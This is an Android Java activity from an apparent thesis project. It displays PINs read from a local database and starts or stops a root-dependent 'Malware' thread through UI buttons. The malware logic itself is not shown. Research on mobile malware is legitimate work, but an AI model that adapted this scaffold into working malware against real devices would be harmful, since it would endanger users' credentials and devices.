package com.example.thesis;

import androidx.appcompat.app.AppCompatActivity;

import android.os.Bundle;
import android.view.View;
import android.widget.TextView;
import android.widget.Toast;


public class MainActivity extends AppCompatActivity {
    private Malware malware;
    private boolean malwareRunning = false;

    private DatabaseService database;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        database = new DatabaseService(this);

        // TODO: get PINs from db and add them to texttviews.
        String PIN1 = database.getPIN(1);
        TextView textView = (TextView) findViewById(R.id.textPIN1);
        textView.setText("PIN1: " + PIN1);

        String PIN2 = database.getPIN(2);
        textView = (TextView) findViewById(R.id.textPIN2);
        textView.setText("PIN 2: " + PIN2);
    }


    public void startMalware(View view) {
        if (CheckRoot.hasRootAccess()) {
            if (!malwareRunning) {
                malwareRunning = true;
                malware = new Malware(this, MainActivity.this, database);
                Thread malwareThread = new Thread(malware, "Malware Thread");
                malwareThread.start();
                Toast.makeText(this, "Started malware!", Toast.LENGTH_SHORT).show();
            } else {
                Toast.makeText(this, "Malware is already running!", Toast.LENGTH_SHORT).show();
            }
        } else {
            Toast.makeText(this, "Can't start, has no root access!", Toast.LENGTH_SHORT).show();
        }


    }

    public void stopMalware(View view) {
        malware.doStop();
        malwareRunning = false;
        Toast.makeText(this, "Stopped malware!", Toast.LENGTH_SHORT).show();
    }
}
